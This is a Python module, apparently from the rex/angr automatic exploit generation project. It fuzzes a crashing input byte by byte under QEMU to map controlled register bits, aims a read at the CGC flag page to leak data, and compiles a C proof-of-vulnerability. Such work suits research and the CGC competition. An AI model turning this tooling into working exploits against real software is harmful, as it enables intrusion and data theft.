import os
import random
import logging
import tempfile
import operator
import itertools
from collections import defaultdict
from multiprocessing import Pool
from functools import reduce

from angrop import rop_utils
import claripy
from cle import CLEError
from povsim import CGCPovSimulator
import angr
import tracer
import compilerex

from ..crash import CannotExploit
from . import fuzzing_type_2_c_template

l = logging.getLogger("rex.fuzzing_type_1")
logging.getLogger("cle.elfcore").setLevel("CRITICAL")
logging.getLogger("tracer.qemu_runner").setLevel("DEBUG")
l.setLevel("DEBUG")


CGC_GENERAL_REGS = ["eax", "ecx", "edx", "ebx", "esp", "ebp", "esi", "edi"]
_PREFILTER_BYTES = {"0", "1", "A", "B", "\xff", "\x00"}
_PREFILTER_BYTES.update(chr(random.randint(0, 255)) for _ in range(10))
_PREFILTER_BYTES = set(ord(c) for c in _PREFILTER_BYTES)
CGC_FLAG_PAGE = 0x4347c000


class ByteAnalysis(object):
    def __init__(self):
        self.valid_bytes = set()
        self.bytes_that_dont_crash = set()
        self.bytes_that_cause_diff_crash = set()
        self.bytes_that_change_registers = set()
        self.register_pattern_maps = dict()
        self.register_bitmasks = dict()
        self.is_complex = False
        self.reg_vals = dict()


class NumberStr(object):
    def __init__(self, min_len, max_len, start_idx, end_idx, max_val, base):
        self.min_len = min_len
        self.max_len = max_len
        self.start_idx = start_idx
        self.end_idx = end_idx
        self.base = base
        self.max_val = max_val


class CrashFuzzerException(Exception):
    pass


class ComplexAnalysisException(CrashFuzzerException):
    pass


# TODO consider removing dependence on angr
# TODO handle timeouts
# TODO move to it's own project?
# TODO make this fast bprm->core_dump
# TODO rewrite to construct payload in sections of sends or at least where things need to be changed
# have qemu write to stderr?
def _get_reg_vals(binary_input_byte):
    binary, test_input, c = binary_input_byte
    r = tracer.QEMURunner(binary, input=test_input)
    if not r.crash_mode:
        return [c, None]
    else:
        reg_vals = dict()
        for reg in CGC_GENERAL_REGS + ["eip"]:
            reg_vals[reg] = r.reg_vals[reg]
        return [c, r.reg_vals]


# TODO Make sure we only look at general registers that cgc accepts
# TODO we assume the input is constant length ie random/flag page has no effect on it
class Type2CrashFuzzer(object):
    def __init__(self, binary, crash=None):
        """
        :param binary: path to the binary which crashed
        :param crash: string of input which crashed the binary
        """

        self.binary = binary
        self.crash = crash

        # verify it actually crashes the binary
        r = tracer.QEMURunner(self.binary, input=self.crash, record_stdout=True, record_core=True)
        if not r.crash_mode:
            raise CrashFuzzerException("input did not crash the binary")

        self.orig_stdout = r.stdout

        self.addr_ast = None
        try:
            self._p = angr.Project(self.binary)

            self.orig_regs = r.reg_vals
            s = rop_utils.make_symbolic_state(self._p, reg_list=CGC_GENERAL_REGS)
            self._reg_asts = dict()
            for r in CGC_GENERAL_REGS:
                ast = s.se.BVS(r, 32, explicit_name=True)
                self._reg_asts[r] = ast
                s.registers.store(r, ast)
            s.ip = self.orig_regs["eip"]
            all_succ = self._p.factory.successors(s, num_inst=1).all_successors
            if len(all_succ) == 0:
                raise CannotExploit("no successors")
            succ = all_succ[0]
            for a in succ.history.recent_actions:
                if a.type == "mem" and a.action == "read":
                    dependencies = a.addr.ast.variables
                    self.addr_ast = a.addr.ast
                    self.reg_deps = dependencies | {"AST"}

            self.orig_regs = self._fix_reg_vals(self.orig_regs)

            l.debug("REG DEPS: %s", self.reg_deps)
        except CLEError as e:
            l.warning("CLEError: %s", e)
            pass

        if self.addr_ast is None:
            self.reg_deps = set(CGC_GENERAL_REGS)
            l.warning("couldn't find read addr depenency")

        self.pool = None
        self.byte_analysis = dict()
        self._bases = dict()
        self.skip_bytes = set()
        self.skip_sets = set()
        self.regs_to_numbers = dict()
        self.used_bytes = set()
        self.byte_translation_funcs = list()
        self.byte_translation_calls = dict()
        self._bit_patterns = dict()
        self._raw_payload = None
        self.output_leak_idx = None
        self.cgc_type = 2

        self.make_bases()
        self.run()
        self.post_filter()
        self.post_analysis()

    def make_bases(self):
        for base in range(2, 20):
            accepted_chars = set()
            accepted_chars.update(chr(i+ord("0")) for i in range(0, min(base, 10)))
            if base > 10:
                for i in range(10, base):
                    accepted_chars.add(chr(ord("a")+i-10))
                    accepted_chars.add(chr(ord("A")+i-10))
            self._bases[base] = accepted_chars

    def run(self):
        self.pool = Pool(processes=8)
        # for each byte of input we will try all possible characters and determine how they change bits in the registers
        # FIXME fake range here
        for i in range(0, len(self.crash)):
            interesting = self.analyze_bytes([i])
            if not interesting:
                interesting = self.check_for_multiple(i)
        self.pool.close()

    @staticmethod
    def _replace_indices(s, c, indices):
        for i in indices:
            s = s[:i] + bytes([c]) + s[i+1:]
        return s

    @staticmethod
    def _replace_indices_len(s, to_rep, len_to_remove, indices):
        for i in indices:
            s = s[:i] + to_rep + s[i+len_to_remove:]
        return s

    def _fix_reg_vals(self, reg_vals):
        if self.addr_ast is None:
            return reg_vals
        # if we have an ast fix it!
        out_val = self.addr_ast
        reg_vals2 = {self._reg_asts[r]: claripy.BVV(v, 32) for r, v in reg_vals.items() if r in CGC_GENERAL_REGS}
        replace_dict = {a.cache_key: b for a, b in reg_vals2.items()}
        out_val = out_val.replace_dict(replace_dict)
        if out_val.symbolic:
            raise CannotExploit("symbolic value after replacing regs")
        return {"AST": out_val.args[0], "eip": reg_vals["eip"]}


    def _get_bit_patterns(self, number_bits, bit_indices):
        bit_indices = tuple(sorted(bit_indices))
        if (number_bits, bit_indices) in self._bit_patterns:
            return set(self._bit_patterns[(number_bits, bit_indices)])
        all_patterns = set()
        for i in range(2 ** number_bits):
            pattern = 0
            for n, index in enumerate(bit_indices):
                if (1 << n) & i != 0:
                    pattern |= (1 << index)

            all_patterns.add(pattern)
        self._bit_patterns[(number_bits, bit_indices)] = set(all_patterns)
        return all_patterns

    def analyze_bytes(self, byte_indices):
        if any(i in self.skip_bytes for i in byte_indices):
            return False
        if frozenset(set(byte_indices)) in self.skip_sets:
            return False
        if len(byte_indices) == 1:
            l.info("fuzzing byte %d", byte_indices[0])
        else:
            l.info("fuzzing bytes %s", byte_indices)
        bytes_to_regs = dict()

        bytes_that_change_crash = set()
        bytes_that_dont_crash = set()
        bytes_that_dont_affect_regs = set()
        bytes_that_affect_regs = set()

        # run on the prefilter
        binary_input_bytes = []
        for i in _PREFILTER_BYTES:
            test_input = self._replace_indices(self.crash, i, byte_indices)
            binary_input_bytes.append((self.binary, test_input, chr(i)))
        it = self.pool.imap_unordered(_get_reg_vals, binary_input_bytes)
        for c, reg_vals in it:
            if reg_vals is not None:
                reg_vals = self._fix_reg_vals(reg_vals)
                bytes_to_regs[c] = reg_vals
            else:
                bytes_that_dont_crash.add(c)

        possible_sets = defaultdict(set)
        for c in sorted(bytes_to_regs.keys()):
            reg_vals = bytes_to_regs[c]
            num_diff = 0
            for r in reg_vals.keys():
                if r not in self.reg_deps:
                    continue
                possible_sets[r].add(reg_vals[r])
                if reg_vals[r] != self.orig_regs[r]:
                    num_diff += 1

            if num_diff == 0:
                bytes_that_dont_affect_regs.add(c)
            elif reg_vals["eip"] != self.orig_regs["eip"]:
                bytes_that_change_crash.add(c)
            else:
                bytes_that_affect_regs.add(c)
        if len(bytes_that_affect_regs) == 0:
            return False
        if all(len(possible_sets[r]) <= 2 for r in possible_sets):
            return False

        for i in range(256):
            if i in _PREFILTER_BYTES:
                continue
            test_input = self._replace_indices(self.crash, i, byte_indices)
            binary_input_bytes.append((self.binary, test_input, chr(i)))
        it = self.pool.imap_unordered(_get_reg_vals, binary_input_bytes, chunksize=4)
        for c, reg_vals in it:
            if reg_vals is not None:
                reg_vals = self._fix_reg_vals(reg_vals)
                bytes_to_regs[c] = reg_vals
            else:
                bytes_that_dont_crash.add(c)

        ip_counts = defaultdict(int)
        for reg_vals in bytes_to_regs.values():
            ip_counts[reg_vals["eip"]] += 1

        # if multiple registers change we might've found a different crash
        for c in sorted(bytes_to_regs.keys()):
            reg_vals = bytes_to_regs[c]
            num_diff = 0
            for r in reg_vals.keys():
                if reg_vals[r] != self.orig_regs[r]:
                    num_diff += 1

            if num_diff == 0:
                bytes_that_dont_affect_regs.add(c)
            elif reg_vals["eip"] != self.orig_regs["eip"]:
                bytes_that_change_crash.add(c)
            else:
                bytes_that_affect_regs.add(c)

        l.debug("%d bytes don't crash, %d bytes don't affect regs",
                len(bytes_that_dont_crash), len(bytes_that_dont_affect_regs))

        # the goal here is to find which bits of regs are contolled here
        all_reg_vals = defaultdict(set)
        for c in bytes_that_affect_regs:
            reg_vals = bytes_to_regs[c]
            for reg in reg_vals.keys():
                all_reg_vals[reg].add(reg_vals[reg])

        byte_analysis = ByteAnalysis()
        for i in byte_indices:
            self.byte_analysis[i] = byte_analysis
        byte_analysis.valid_bytes = set(bytes_to_regs.keys())

        found_interesting = False

        for reg in all_reg_vals.keys():
            if reg not in self.reg_deps:
                continue
            possible_vals = all_reg_vals[reg]
            bits_that_can_be_set = 0
            bits_that_can_be_unset = 0
            for val in possible_vals:
                bits_that_can_be_set |= val
                bits_that_can_be_unset |= ((~val) & 0xffffffff)
            controlled_bits = bits_that_can_be_set & bits_that_can_be_unset
            while controlled_bits != 0:
                number_bits = bin(controlled_bits).count("1")
                bit_indices = []
                for i, c in enumerate(bin(controlled_bits).replace("0b", "").rjust(32, "0")):
                    if c == "1":
                        bit_indices.append(31-i)
                if number_bits > 8:
                    if self.analyze_complex(byte_indices, reg, bytes_to_regs):
                        return True
                    else:
                        return False

                # might want to check for impossible bit patterns
                if controlled_bits != 0:
                    # check that all bitmasks are possible for those bits

                    # now map the patterns were not possible
                    all_patterns = self._get_bit_patterns(number_bits, bit_indices)

                    byte_analysis.register_pattern_maps[reg] = dict()

                    impossible_patterns = set(all_patterns)
                    for c in bytes_to_regs.keys():
                        reg_val = bytes_to_regs[c][reg]
                        pattern = reg_val & controlled_bits
                        byte_analysis.register_pattern_maps[reg][pattern] = c
                        impossible_patterns.discard(pattern)

                    # now we want to find a minimum set of bits
                    if len(impossible_patterns) > 0:
                        l.warning("not all patterns viable, decreasing bit patterns")
                        # remove a bit with the least variety
                        possible_patterns = all_patterns - impossible_patterns
                        bit_counts = dict()
                        for bit in bit_indices:
                            bit_counts[bit] = 0
                        for pattern in possible_patterns:
                            for bit in bit_indices:
                                if pattern & (1 << bit) != 0:
                                    bit_counts[bit] += 1
                                else:
                                    bit_counts[bit] -= 1
                        bit_to_remove = max(bit_counts.items(), key=lambda x: abs(x[1]))[0]
                        l.info("removing bit %d", bit_to_remove)
                        controlled_bits &= (~(1 << bit_to_remove))
                    else:
                        break

            if controlled_bits != 0:
                l.info("Register %s has the following bitmask %s for bytes %s of the input",
                       reg, hex(controlled_bits), byte_indices)
                byte_analysis.register_bitmasks[reg] = controlled_bits
                found_interesting = True
                byte_analysis.reg_vals = bytes_to_regs

            # todo remove conflicts

        return found_interesting

    def post_filter(self):
        to_remove = set()
        for b in self.byte_analysis:
            for b2 in self.byte_analysis:
                if b == b2 or self.byte_analysis[b] == self.byte_analysis[b2]:
                    continue
                else:
                    for r in self.byte_analysis[b].register_bitmasks:
                        if r in self.byte_analysis[b2].register_bitmasks and \
                                                self.byte_analysis[b].register_bitmasks[r] & \
                                                self.byte_analysis[b2].register_bitmasks[r] != 0:
                            mask1 = self.byte_analysis[b].register_bitmasks[r]
                            mask2 = self.byte_analysis[b2].register_bitmasks[r]
                            if mask1 | mask2 == mask2:
                                to_remove.add(self.byte_analysis[b])
                            elif mask1 | mask2 == mask1:
                                to_remove.add(self.byte_analysis[b2])
                            else:
                                pass
        for b in dict(self.byte_analysis):
            if self.byte_analysis[b] in to_remove:
                del self.byte_analysis[b]

    def check_for_multiple(self, byte_index):
        found_interesting = False
        # we will look for if the same pattern has to be somewhere else in the payload
        substr = self.crash[byte_index:byte_index+3]
        if len(substr) > 2 and self.crash.count(substr) > 1:
            all_starts = list(self._str_find_all(self.crash, substr))
            if len(all_starts) == 1:
                return
            strs = [self.crash[i:] for i in all_starts]
            common_len = len(self._longest_common_prefix(strs))
            for i in range(common_len):
                found_interesting = self.analyze_bytes([start+i for start in all_starts])
                if not found_interesting:
                    for j in range(i, common_len):
                        self.skip_sets.add(frozenset(start + j for start in all_starts))
                    break
                else:
                    self.skip_bytes.update(start + i for start in all_starts)
        return found_interesting

    @staticmethod
    def _str_find_all(a_str, sub):
        start = 0
        while True:
            start = a_str.find(sub, start)
            if start == -1:
                return
            yield start
            start += 1

    @staticmethod
    def _longest_common_prefix(strs):
        common_prefix = ""
        for i in zip(*strs):
            if i.count(i[0]) == len(i):
                common_prefix += i[0]
            else:
                break
        return common_prefix

    def read_int(self, s, base, max_len):
        accepted_chars = self._bases[base]
        end = 0
        while end < min(len(s), max_len) and s[end] in accepted_chars:
            end += 1

        if end == 0:
            return None
        else:
            return int(s[:end], base) & 0xffffffff

    def analyze_complex(self, byte_indices, reg, bytes_to_regs):
        # returns whether or not the analyses found something

        # do some checks
        votes = defaultdict(int)
        remainder = self._longest_common_prefix([self.crash[i+1:] for i in byte_indices])
        for c in bytes_to_regs:
            expected = bytes_to_regs[c][reg]
            s = c + remainder
            for base in range(2, 20):
                for max_len in range(2, 20):
                    if self.read_int(s, base, max_len) == expected:
                        votes[(base, max_len)] += 1
                        break

        if len(votes) == 0:
            l.warning("unknown complex byte")
            return False
        base, current_len = max(votes.keys(), key=lambda x: votes[x])
        l.debug("chose base %d with max len %d", base, current_len)

        # now we need to decide if we can actually change the length of the integer
        max_working = current_len
        min_working = current_len
        for i in range(1, current_len + 10):
            test_input = self._replace_indices_len(self.crash, b"1"*i, current_len, byte_indices)
            expected = int("1"*i, base) & 0xffffffff
            reg_vals = _get_reg_vals((self.binary, test_input, 0))[1]
            if reg_vals is None or reg_vals[reg] != expected:
                pass
            else:
                max_working = max(max_working, i)
                min_working = min(min_working, i)
        l.debug("Decided that input length has a min of %d and a max of %d", min_working, max_working)
        l.debug("Currently starts at index %d and ends at index %d", byte_indices[0], byte_indices[0]+current_len)
        if len(byte_indices) > 1:
            l.debug("Multiple copies of the int str at indices %s", byte_indices)

        # now we set up what's needed
        for i in byte_indices:
            self.skip_bytes.update(range(i, i+current_len))
        max_val = min(base**(max_working+1)-1, 0x7fffffff)

        l.debug("found atoi for reg %s at byte_indices %s", reg, byte_indices)

        self.regs_to_numbers[reg] = set()
        for i in byte_indices:
            num_str = NumberStr(min_working, max_working, i, i + current_len, max_val, base)
            self.regs_to_numbers[reg].add(num_str)
        return True

    def can_control_read(self, reg):
        flag_bits = CGC_FLAG_PAGE >> 12

        # shouldn't unset any already good bits
        orig_bits = self.orig_regs[reg] >> 12
        orig_matching_bits = (~(flag_bits ^ orig_bits)) & 0xfffff

        curr_best_matches = []

        for i in self.byte_analysis:
            ast_vals = [x["AST"] for x in self.byte_analysis[i].reg_vals.values()]
            for a in ast_vals:
                bits = a >> 12
                matching_bits = ~(flag_bits ^ bits) & 0xfffff
                if matching_bits & orig_matching_bits != orig_matching_bits:
                    continue
                else:
                    is_better_than_curr = True
                    for b in list(curr_best_matches):
                        matching_bits_b = ~(flag_bits ^ b) & 0xfffff
                        if matching_bits & matching_bits_b == matching_bits:
                            is_better_than_curr = False
                        elif matching_bits & matching_bits_b == matching_bits_b:
                            curr_best_matches.remove(b)
                    if is_better_than_curr:
                        curr_best_matches.append(bits)

        # verify it can be pointed at flag page
        all_bits = reduce(operator.__or__, [~(x ^ flag_bits) & 0xfffff for x in curr_best_matches])
        if bin(all_bits).count("1") < 20:
            return False

        match_dict = defaultdict(set)
        # now get all bytes that match each best
        for i in self.byte_analysis:
            for b in self.byte_analysis[i].reg_vals:
                a = self.byte_analysis[i].reg_vals[b][reg]
                bits = a >> 12
                if bits in curr_best_matches:
                    match_dict[bits].add((i, b))

        return True

    def post_analysis(self):
        regs_to_check = []
        if "AST" in self.orig_regs:
            regs_to_check.append("AST")
        else:
            regs_to_check = CGC_GENERAL_REGS

        for reg in regs_to_check:
            flag_bits = CGC_FLAG_PAGE >> 12

            # shouldn't unset any already good bits
            orig_bits = self.orig_regs[reg] >> 12
            orig_matching_bits = (~(flag_bits ^ orig_bits)) & 0xfffff

            curr_best_matches = []

            for i in self.byte_analysis:
                ast_vals = [x["AST"] for x in self.byte_analysis[i].reg_vals.values()]
                for a in ast_vals:
                    bits = a >> 12
                    matching_bits = ~(flag_bits ^ bits) & 0xfffff
                    if matching_bits & orig_matching_bits != orig_matching_bits:
                        continue
                    else:
                        is_better_than_curr = True
                        for b in list(curr_best_matches):
                            matching_bits_b = ~(flag_bits ^ b) & 0xfffff
                            if matching_bits & matching_bits_b == matching_bits:
                                is_better_than_curr = False
                            elif matching_bits & matching_bits_b == matching_bits_b:
                                curr_best_matches.remove(b)
                        if is_better_than_curr:
                            curr_best_matches.append(bits)

            # verify it can be pointed at flag page
            all_bits = reduce(operator.__or__, [~(x ^ flag_bits) & 0xfffff for x in curr_best_matches])
            if bin(all_bits).count("1") < 20:
                continue

            match_dict = defaultdict(set)
            # now get all bytes that match each best
            for i in self.byte_analysis:
                for b in self.byte_analysis[i].reg_vals:
                    a = self.byte_analysis[i].reg_vals[b][reg]
                    bits = a >> 12
                    if bits in curr_best_matches:
                        match_dict[bits].add((i, b))

            # now pick a random from each set, dump an input and see if we get more output
            choices = []
            for bits in match_dict:
                choices.append(random.choice(list(match_dict[bits])))

            new_input = self.crash
            for index, b in choices:
                new_input = self._replace_indices(new_input, b, [index])

            r = tracer.QEMURunner(self.binary, input=new_input, record_stdout=True, record_magic=True)
            new_stdout = r.stdout
            if len(new_stdout) > len(self.orig_stdout):
                # okay we have a leak
                # now we should try to guess what we leaked
                leak_idx = None
                for i in range(len(new_stdout)):
                    if new_stdout[i:i+4] in r.magic:
                        leak_idx = i
                        break
                if leak_idx is None:
                    # need to send to colorguard...
                    l.warning("need to send to colorguard but not implemented")
                    self._raw_payload = new_input
                else:
                    self._raw_payload = new_input
                    self.output_leak_idx = leak_idx
                    num_good = 0
                    if self.test_binary(enable_randomness=False):
                        num_good +=1
                        l.warning("works with no randomness")
                    for i in range(5):
                        if self.test_binary(enable_randomness=True):
                            num_good += 1
                    l.warning("worked %d/6 times", num_good)

                    if num_good > 0:
                        break
            return None

    def exploitable(self):
        if self.output_leak_idx is not None:
            return True
        return False

    def dumpable(self):
        if self._raw_payload is not None:
            return True
        return False

    def get_leaking_payload(self):
        if self._raw_payload is None:
            raise CannotExploit
        return self._raw_payload

    def dump_c(self, filename=None):
        """
        Creates a simple C file to do the type1 exploit
        :param filename: dumps the code to this path if filename is not None
        :return: the c_code
        """
        encoded_payload = ""
        for c in self._raw_payload:
            encoded_payload += "\\x%02x" % ord(c)

        fmt_args = dict()
        fmt_args["payload"] = encoded_payload
        fmt_args["payloadsize"] = str(len(self._raw_payload))
        fmt_args["output_leak_idx"] = str(self.output_leak_idx)

        # TODO using .format is annoying because of all the curly braces
        # figure out how to do this better
        c_code = fuzzing_type_2_c_template.c_template
        for k, v in fmt_args.items():
            c_code = c_code.replace("{%s}" % k, v)

        if filename is not None:
            with open(filename, 'w') as f:
                f.write(c_code)
        else:
            return c_code

    def dump_binary(self, filename=None):
        c_code = self.dump_c()
        compiled_result = compilerex.compile_from_string(c_code,
                                                         filename=filename)
        return compiled_result

    def test_binary(self, enable_randomness=True, timeout=5):
        """
        Test the binary generated
        """

        # dump the binary code
        pov_binary_filename = tempfile.mktemp(dir='/tmp', prefix='rex-pov-')
        self.dump_binary(filename=pov_binary_filename)

        pov_tester = CGCPovSimulator()
        result = pov_tester.test_binary_pov(pov_binary_filename, self.binary, enable_randomness=enable_randomness,
                                            timeout=timeout)
        os.remove(pov_binary_filename)
        return result

    @staticmethod
    def collapse_bits(val, mask):
        bit_index = 0
        out = 0
        for i in range(32):
            if mask & (1 << i) != 0:
                if val & (1 << i) != 0:
                    out |= (1 << bit_index)
                bit_index += 1
        return out
